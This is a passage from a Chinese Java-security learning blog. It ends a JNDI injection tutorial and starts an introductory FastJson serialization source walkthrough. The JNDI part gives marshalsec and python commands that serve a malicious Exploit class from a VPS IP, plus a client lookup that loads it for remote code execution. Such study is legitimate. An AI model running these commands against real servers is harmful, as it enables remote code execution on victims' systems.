var21;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception var22) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> UnexpectedException(<span class="string">&quot;undeclared checked exception&quot;</span>, var22);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>之后通过<code>RegistryContext#decodeObject</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> Object <span class="title">decodeObject</span><span class="params">(Remote var1, Name var2)</span> <span class="keyword">throws</span> NamingException </span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        Object var3 = var1 <span class="keyword">instanceof</span> RemoteReference ? ((RemoteReference)var1).getReference() : var1;</span><br><span class="line">        <span class="keyword">return</span> NamingManager.getObjectInstance(var3, var2, <span class="keyword">this</span>, <span class="keyword">this</span>.environment);</span><br><span class="line">    &#125; ……</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/84fa1cf7b69647b18c30d27682db4285.png" alt="img"></p>
<p>然后在<code>NamingManager#getObjectInstance</code>中根据Reference获取Factory</p>
<p><img src="https://img-blog.csdnimg.cn/904a183a7b1947589f00d36a38f295f3.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAYW1ldXU=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"></p>
<p>这里codebase的值就成了我们传进去的带有恶意类的url</p>
<p><img src="https://img-blog.csdnimg.cn/0c74cec9f88d4b4fbcc8321a9e523321.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAYW1ldXU=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"></p>
<p>之后通过<code>loadClass</code>对类进行加载，运行了Exploit中的静态代码实现RCE</p>
<p><img src="https://img-blog.csdnimg.cn/746812b0c5954c9cae50937006c06e87.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAYW1ldXU=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"></p>
<h4 id="LDAP"><a href="#LDAP" class="headerlink" title="LDAP"></a>LDAP</h4><blockquote>
<p>使用范围更广</p>
<p>需要：com.sun.jndi.ldap.object.trustURLCodebase 为 true ， JDK 11.0.1 、 8u191 、 7u201 、 6u211 开始默认为 false </p>
</blockquote>
<p>攻击流程：</p>
<blockquote>
<ol>
<li>攻击者为易受攻击的JNDI lookup提供了一个<strong>绝对的</strong>LDAP URL</li>
<li>服务器连接到由攻击者控制的LDAP服务器，该服务器返回恶意JNDI  Reference</li>
<li>服务器解码JNDI Reference</li>
<li>服务器从攻击者控制的服务器获取Factory类</li>
<li>服务器实例化Factory类，实现RCE</li>
</ol>
</blockquote>
<p>用marshalsec开一个服务，将Exploit类编译之后放到vps上，然后用python在对应的目录下开启服务</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 -m http.server --bind 0.0.0.0 8000 </span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer &#x27;http://82.156.2.166:8888/#Exploit&#x27; 9000</span><br></pre></td></tr></table></figure>

<p>客户端：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> JNDI.RMI;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.jndi.rmi.registry.RegistryContext;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.Context;</span><br><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"><span class="keyword">import</span> javax.naming.NamingException;</span><br><span class="line"><span class="keyword">import</span> java.util.Properties;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">JNDIClient</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NamingException </span>&#123;</span><br><span class="line">        Context context = <span class="keyword">new</span> InitialContext();</span><br><span class="line">    context.lookup(<span class="string">&quot;ldap://82.156.2.166:9000/Exploit&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/c108fdc536a74721a697ccf127512c20.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAYW1ldXU=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"></p>
<h4 id="工具运用"><a href="#工具运用" class="headerlink" title="工具运用"></a>工具运用</h4><p>可以利用工具搭建服务端</p>
<h5 id="marshalsec"><a href="#marshalsec" class="headerlink" title="marshalsec"></a>marshalsec</h5><p><a href="https://github.com/mbechler/marshalsec">marshalsec</a></p>
<p>命令格式：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">java -cp target/marshalsec-0.0.1-SNAPSHOT-all.jar marshalsec.&lt;Marshaller&gt; [-a] [-v] [-t] [&lt;gadget_type&gt; [&lt;arguments...&gt;]]</span><br></pre></td></tr></table></figure>

<p>RMI:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer http://127.0.0.1:8888/#ExportObject 1099</span><br></pre></td></tr></table></figure>

<p>LDAP:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer &#x27;http://127.0.0.1:8888/#Exploit&#x27; 9000</span><br></pre></td></tr></table></figure>

<p>……</p>
<h4 id="小结-1"><a href="#小结-1" class="headerlink" title="小结"></a>小结</h4><blockquote>
<p> FaIth4444师傅的总结</p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/723174794616450390c12d3f10f834fa.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAYW1ldXU=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"></p>
<h3 id="Reference-1"><a href="#Reference-1" class="headerlink" title="Reference"></a>Reference</h3><p><a href="https://govuln.com/">代码审计星球</a></p>
<p><a href="https://www.cnblogs.com/cute-puli/p/14373826.html">少走弯路之marshalsec的编译（RMI必备工具） - 铺哩 - 博客园 (cnblogs.com)</a></p>
<p><a href="https://www.freebuf.com/articles/web/317622.html">https://www.freebuf.com/articles/web/317622.html</a></p>
<p><a href="https://paper.seebug.org/1091/#jndildap">https://paper.seebug.org/1091/#jndildap</a></p>
<p><a href="https://blog.csdn.net/whatday/article/details/107942941">https://blog.csdn.net/whatday/article/details/107942941</a></p>
]]></content>
      <categories>
        <category>没有人比我更爱学习</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>序列化</tag>
        <tag>CC1</tag>
        <tag>RMI</tag>
        <tag>清明节也没人能阻止我学习</tag>
      </tags>
  </entry>
  <entry>
    <title>Java初步学习Ⅳ</title>
    <url>/2022/04/15/Java%E5%88%9D%E6%AD%A5%E5%AD%A6%E4%B9%A0%E2%85%A3/</url>
    <content><![CDATA[<blockquote>
<p>FastJson入门啦~  持续更新中</p>
</blockquote>
<h2 id="FastJson入门"><a href="#FastJson入门" class="headerlink" title="FastJson入门"></a>FastJson入门</h2><p>Fastjson是Alibaba维护的开源JSON解析库，其优势是”快”。它可以解析 JSON 格式的字符串，⽀持将 Java Bean 序列 化为 JSON 字符串，也可以从JSON字符串反序列化到 Java Bean 。</p>
<p><a href="https://github.com/alibaba/fastjson">alibaba/fastjson</a></p>
<span id="more"></span>

<p><code>vsersion: 1.2.24</code></p>
<h3 id="序列化"><a href="#序列化" class="headerlink" title="序列化"></a>序列化</h3><ul>
<li><strong>Json.toJSONString</strong></li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> FastJson;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Demo</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String Id;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">char</span> sex;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> score;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Demo</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Demo&quot;</span>);</span><br><span class="line">        <span class="keyword">this</span>.Id = <span class="string">&quot;1&quot;</span>;</span><br><span class="line">        <span class="keyword">this</span>.name = <span class="string">&quot;ameuu&quot;</span>;</span><br><span class="line">        <span class="keyword">this</span>.sex = <span class="string">&#x27;F&#x27;</span>;</span><br><span class="line">        <span class="keyword">this</span>.score = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getId</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;getId&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> Id;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">char</span> <span class="title">getSex</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;getSex&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> sex;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;getName&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getScore</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;getScore&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> score;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setId</span><span class="params">(String id)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;setId&quot;</span>);</span><br><span class="line">        Id = id;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;setName&quot;</span>);</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setSex</span><span class="params">(<span class="keyword">char</span> sex)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;setSex&quot;</span>);</span><br><span class="line">        <span class="keyword">this</span>.sex = sex;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setScore</span><span class="params">(<span class="keyword">int</span> score)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;setScore&quot;</span>);</span><br><span class="line">        <span class="keyword">this</span>.score = score;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Demo&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;Id=&#x27;&quot;</span> + Id + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;, name=&#x27;&quot;</span> + name + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;, sex=&quot;</span> + sex +</span><br><span class="line">                <span class="string">&quot;, score=&quot;</span> + score +</span><br><span class="line">                <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="非自省"><a href="#非自省" class="headerlink" title="非自省"></a>非自省</h4><p><code>JSON.toJSONString()</code>|<code>JSON.toJSON</code>，在序列化的时候会自动调用构造函数以及各种get函数</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> FastJson;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Serialize</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Demo demo = <span class="keyword">new</span> Demo();</span><br><span class="line">        String res = JSON.toJSONString(demo);</span><br><span class="line">        </span><br><span class="line">        System.out.println(res); <span class="comment">// &#123;&quot;id&quot;:&quot;1&quot;,&quot;name&quot;:&quot;ameuu&quot;,&quot;score&quot;:0,&quot;sex&quot;:&quot;F&quot;&#125;</span></span><br><span class="line">        System.out.println(JSON.toJSON(demo)); <span class="comment">// &#123;&quot;score&quot;:0,&quot;sex&quot;:&quot;F&quot;,&quot;name&quot;:&quot;ameuu&quot;,&quot;id&quot;:&quot;1&quot;&#125;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="自省"><a href="#自省" class="headerlink" title="自省"></a>自省</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Serialize</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Demo demo = <span class="keyword">new</span> Demo();</span><br><span class="line">        System.out.println(JSON.toJSONString(demo, SerializerFeature.WriteClassName));</span><br><span class="line"><span class="comment">//        &#123;&quot;@type&quot;:&quot;FastJson.Demo&quot;,&quot;id&quot;:&quot;1&quot;,&quot;name&quot;:&quot;ameuu&quot;,&quot;score&quot;:0,&quot;sex&quot;:&quot;F&quot;&#125;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h3><p>在一开始自己尝试的时候发现：</p>
<p><code>Demo demo = (Demo)JSON.parse(serialize);</code>会报错</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Deserialize</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        String serialize = <span class="string">&quot;&#123;\&quot;id\&quot;:\&quot;1\&quot;,\&quot;name\&quot;:\&quot;ameuu\&quot;,\&quot;score\&quot;:0,\&quot;sex\&quot;:\&quot;F\&quot;&#125;&quot;</span>;</span><br><span class="line">        Object demo = JSON.parse(serialize);</span><br><span class="line">        JSONObject demo1 = JSON.parseObject(serialize);</span><br><span class="line">        System.out.println(demo1); <span class="comment">// 输出出来也只是一串字符串 并没有调用toString</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>所以我们可以先获取他的<code>Class</code>，我们可以发现一开始并没有真正得获取到我们原本的对象，然后在第三个方法获得我们的对象的时候会自动调用构造函数并且setter</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Deserialize</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        String serialize = <span class="string">&quot;&#123;\&quot;id\&quot;:\&quot;1\&quot;,\&quot;name\&quot;:\&quot;ameuu\&quot;,\&quot;score\&quot;:0,\&quot;sex\&quot;:\&quot;F\&quot;&#125;&quot;</span>;</span><br><span class="line">        <span class="comment">// JSON.parse Class = class com.alibaba.fastjson.JSONObject</span></span><br><span class="line">        System.out.println(<span class="string">&quot;JSON.parse Class = &quot;</span>+JSON.parse(serialize).getClass());</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// JSON.parseObject Class = class com.alibaba.fastjson.JSONObject</span></span><br><span class="line">        System.out.println(<span class="string">&quot;JSON.parseObject Class = &quot;</span>+JSON.parseObject(serialize).getClass());</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// JSON.parseObject(String,Class) Class = class FastJson.Demo</span></span><br><span class="line">        System.out.println(<span class="string">&quot;JSON.parseObject(String,Class) Class = &quot;</span> +JSON.parseObject(serialize,Demo.class).getClass());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>但是就比如序列化中存在的自省，如果字符串前面有<code>@type</code>，前面两个方法也是可以直接获得原本的对象的，而第一种在输出的时候会直接调用toString方法，而第二种方法虽然输出的时候还是会输出<code>com.alibaba.fastjson.JSONObject</code>，但是会调用setter和getter</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Deserialize</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        String serialize = <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;FastJson.Demo\&quot;,\&quot;id\&quot;:\&quot;1\&quot;,\&quot;name\&quot;:\&quot;ameuu\&quot;,\&quot;score\&quot;:0,\&quot;sex\&quot;:\&quot;F\&quot;&#125;&quot;</span>;</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;JSON.parse Class = &quot;</span>+JSON.parse(serialize));</span><br><span class="line">        System.out.println(<span class="string">&quot;JSON.parseObject Class = &quot;</span>+JSON.parseObject(serialize).getClass());</span><br><span class="line">        System.out.println(<span class="string">&quot;JSON.parseObject(String,Class) Class = &quot;</span> +JSON.parseObject(serialize,Demo.class).getClass());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h3><p>想看一下为什么会调用setter、getter</p>
<h4 id="前置-Feature"><a href="#前置-Feature" class="headerlink" title="前置 Feature"></a>前置 Feature</h4><table>
<thead>
<tr>
<th>名字</th>
<th>作用</th>
<th>默认状态</th>
</tr>
</thead>
<tbody><tr>
<td>Feature.AutoCloseSource</td>
<td>决定解析器是否将自动关闭那些不属于parse自己的输入流。<strong>Parser close时⾃动关闭为创建Parser实例⽽创建的底层InputStream以及Reader等输⼊流</strong></td>
<td>true</td>
</tr>
<tr>
<td>Feature.AllowComment</td>
<td>决定parse是否解析Java/C++样式的注释</td>
<td>false</td>
</tr>
<tr>
<td>Feature.AllowUnQuotedFieldNames</td>
<td>决定parse是否允许使用非双引号属性名字</td>
<td>true</td>
</tr>
<tr>
<td>Feature.AllowSingleQuotes</td>
<td>决定parse是否允许单引号来包住属性名称和字符串值</td>
<td>true</td>
</tr>
<tr>
<td>Feature.InternFieldNames</td>
<td>决定JSON对象属性名称是否可以被<code>String#inter</code>规范化表示。intern：当调用intern方法时，如果已经包含等于此字符串，则返回该字符串，否则，将此对象添加到池中，并且返回此对象的引用。<strong>将json字段名作为字面量缓存起来，即fieldName.intern()</strong></td>
<td>true</td>
</tr>
<tr>
<td>Feature.AllowISO8601DateFormat</td>
<td>识别IOS8601格式的日期字符串，例如：2018-05-31T19：13：42.000Z</td>
<td>false</td>
</tr>
<tr>
<td>Feature.AllowArbitaryCommas</td>
<td>忽略json中包含的连续的多个逗号，非标准特性</td>
<td>false</td>
</tr>
<tr>
<td>Feature.UseBigDecimal</td>
<td>将json中的浮点数解析成BigDecimal对象，禁用后解析成Double对象</td>
<td>true</td>
</tr>
<tr>
<td>Feature.IgnoreNotMatch</td>
<td>解析式忽略未知的字段继续完成解析</td>
<td>true</td>
</tr>
<tr>
<td>Feature.SortFeidFastMatch</td>
<td>如果用fastjson序列化的文本，输出的结果时按照fieldName排序输出的，parse时也能利用这个顺序进行优化读取。这种情况下，parse能够获得非常好的性能</td>
<td>false</td>
</tr>
<tr>
<td>Feature.DisableASM</td>
<td>禁用ASM</td>
<td>false</td>
</tr>
<tr>
<td>Feature.DisableCircularReferenceDetect</td>
<td>禁用循环引用检测</td>
<td>false</td>
</tr>
<tr>
<td>Feature.InitStringFieldAsEmpty</td>
<td>对于没有值的字符串属性设置为空串</td>
<td>false</td>
</tr>
<tr>
<td>Feature.SupportArrayToBean</td>
<td>允许将数组按照字段顺序解析成Java Bean</td>
<td>false</td>
</tr>
<tr>
<td>Feature.OrderedField</td>
<td>解析后属性保持原来的顺序</td>
<td>false</td>
</tr>
<tr>
<td>Feature.DisableSpecialKeyDetect</td>
<td>禁用特殊字符检查</td>
<td>false</td>
</tr>
<tr>
<td>Feature.UseObjectArray</td>
<td>使用对象数组而不是集合</td>
<td>false</td>
</tr>
<tr>
<td>Feature.SupportNonPublicField</td>
<td>使用解析没有setter方法的非public属性</td>
<td>false</td>
</tr>
<tr>
<td>Feature.IgnoreAutoType</td>
<td>禁用fastjson的AUTOTYPE特性，即不按照json字符串中的@type自动选择反序列化类</td>
<td>false</td>
</tr>
<tr>
<td>Feature.DisableFieldSmartMatch</td>
<td>禁用属性智能匹配，例如下划线自动匹配驼峰</td>
<td>false</td>
</tr>
<tr>
<td>Feature.SupportAutoType</td>
<td>启用fastjson的autotype功能，即根据json字符串中的@type自动选择反序列化的类</td>
<td>false</td>
</tr>
<tr>
<td>Feature.NonStringKeyAsString</td>
<td>解析时将为用引号包含的json字段名作为String类型存储，否则只能用原始类型获取key的值。。例如<code>String text=&quot;&#123;123:\&quot;abc\&quot;&#125;&quot;</code>在启⽤了NonStringKeyAsString后可以 通过<code>JSON.parseObject(text).getString(&quot;123&quot;)</code>的⽅式获取到”abc”，⽽在不启 ⽤NonStringKeyAsString时，<code>JSON.parseObject(text).getString(&quot;123&quot;)</code>只 能得到null，必须通过<code>JSON.parseObject(text).get(123)</code>的⽅式才能获取 到”abc”。</td>
<td>false</td>
</tr>
<tr>
<td>Feature.CustomMapDeserializer</td>
<td>自定义<code>&quot;&#123;\&quot;key\&quot;:vakue&#125;&quot;</code>解析成Map实例，否则解析为JSONObject</td>
<td>false</td>
</tr>
<tr>
<td>Feature.ErrorOnEnumNotMatch</td>
<td>枚举未匹配到时抛出异常，否则解析为null</td>
<td>false</td>
</tr>
</tbody></table>
<h4 id="序列化-1"><a href="#序列化-1" class="headerlink" title="序列化"></a>序列化</h4><p>利用<code>toJSONString(object)</code>的时候，依次调用三个<code>toJSONString</code>最后传入<code> JSONSerializer#write</code>对object进行JSON序列化</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">toJSONString</span><span class="params">(Object object)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> toJSONString(object, emptyFilters); </span><br><span class="line">    <span class="comment">//static final SerializeFilter[] emptyFilters = new SerializeFilter[0];</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">toJSONString</span><span class="params">(Object object, SerializeFilter[] filters, SerializerFeature... features)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> toJSONString(object, SerializeConfig.globalInstance, filters, (String)<span class="keyword">null</span>, DEFAULT_GENERATE_FEATURE, features);</span><br><span class="line">    <span class="comment">// public static final SerializeConfig globalInstance = new SerializeConfig();</span></span><br><span class="line">    <span class="comment">// DEFAULT_GENERATE_FEATURE = features;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">toJSONString</span><span class="params">(Object object, SerializeConfig config, SerializeFilter[] filters, String dateFormat, <span class="keyword">int</span> defaultFeatures, SerializerFeature... features)</span> </span>&#123;</span><br><span class="line">    SerializeWriter out = <span class="keyword">new</span> SerializeWriter((Writer)<span class="keyword">null</span>, defaultFeatures, features); <span class="comment">// 实例化</span></span><br><span class="line"></span><br><span class="line">    String var15;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        JSONSerializer serializer = <span class="keyword">new</span> JSONSerializer(out, config); <span class="comment">// 实例化JSONSerializer out : &quot;&quot;</span></span><br><span class="line">        <span class="keyword">if</span> (dateFormat != <span class="keyword">null</span> &amp;&amp; dateFormat.length() != <span class="number">0</span>) &#123; <span class="comment">// null 不进入</span></span><br><span class="line">            serializer.setDateFormat(dateFormat);</span><br><span class="line">            serializer.config(SerializerFeature.WriteDateUseDateFormat, <span class="keyword">true</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (filters != <span class="keyword">null</span>) &#123; <span class="comment">// SerializeFilter</span></span><br><span class="line">            SerializeFilter[] var8 = filters;</span><br><span class="line">            <span class="keyword">int</span> var9 = filters.length;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> var10 = <span class="number">0</span>; var10 &lt; var9; ++var10) &#123;</span><br><span class="line">                SerializeFilter filter = var8[var10];</span><br><span class="line">                serializer.addFilter(filter);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        serializer.write(object); <span class="comment">// JSONSerializer#write</span></span><br><span class="line">        var15 = out.toString();</span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">        out.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> var15;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>JSONSerializer#write</code>，</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title">write</span><span class="params">(Object object)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (object == <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">this</span>.out.writeNull();</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        Class&lt;?&gt; clazz = object.getClass(); <span class="comment">// FastJson.Demon.Class</span></span><br><span class="line">        ObjectSerializer writer = <span class="keyword">this</span>.getObjectWriter(clazz);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            writer.write(<span class="keyword">this</span>, object, (Object)<span class="keyword">null</span>, (Type)<span class="keyword">null</span>, <span class="number">0</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException var5) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(var5.getMessage(), var5);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> ObjectSerializer <span class="title">getObjectWriter</span><span class="params">(Class&lt;?&gt; clazz)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.config.getObjectWriter(clazz); <span class="comment">// this.config = SerializeConfig</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>SerializeConfig#getObjectWriter</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> ObjectSerializer <span class="title">getObjectWriter</span><span class="params">(Class&lt;?&gt; clazz)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.getObjectWriter(clazz, <span class="keyword">true</span>); <span class="comment">// Class FastJson.Demon</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在这里会判断我们传如的对象是什么对象，因为是我们自己创建的对象，所以会到最后的<code>create</code>才进去，调用put和<code>createJavaBeanSerializer</code>，之后便是获取传进去的类的filed，最后返回write（</p>
<p><img src="https://img-blog.csdnimg.cn/065cdfec5df7488383bf0ee03a3e0164.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAYW1ldXU=,size_20,color_FFFFFF,t_70,g_se,x_16"></p>
